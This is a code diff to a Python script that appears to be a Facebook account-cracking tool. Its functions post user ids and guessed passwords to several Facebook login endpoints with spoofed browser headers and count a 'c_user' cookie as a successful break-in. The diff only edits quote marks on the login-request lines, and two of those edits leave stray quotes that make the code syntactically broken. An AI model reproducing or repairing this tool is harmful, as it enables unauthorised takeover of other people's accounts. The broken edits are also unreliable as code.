@@ -1755,7 +1755,7 @@ def p(uid,pwx,tl):
     'priority':'u=0',
     'upgrade-insecure-requests':'1',
 			'user-agent': pro}
-			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb').text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
@@ -1905,7 +1905,7 @@ def mobile(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
 			'user-agent': pro}
-			lo = session.post('https://d.facebook.com/?rtime=1674895922&hrc=1&refsrc=deprecated&_rdr).text
+			lo = session.post('https://d.facebook.com/?rtime=1674895922&hrc=1&refsrc=deprecated&_rdr').text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
@@ -1981,7 +1981,7 @@ def freeq(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
 			'user-agent': pro}
-			lo = session.post('https://m.facebook.com/?rtime=1674895922&hrc=1&refsrc=deprecated&_rdr).text
+			lo = session.post('https://m.facebook.com/?rtime=1674895922&hrc=1&refsrc=deprecated&_rdr').text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
@@ -2056,7 +2056,7 @@ def d(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
 			'user-agent': pro}
-			lo = session.post('https://free.facebook.com/', cookies=cookies, headers=headers).text
+			lo = session.post('https://free.facebook.com/', cookies=cookies, headers=headers').text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
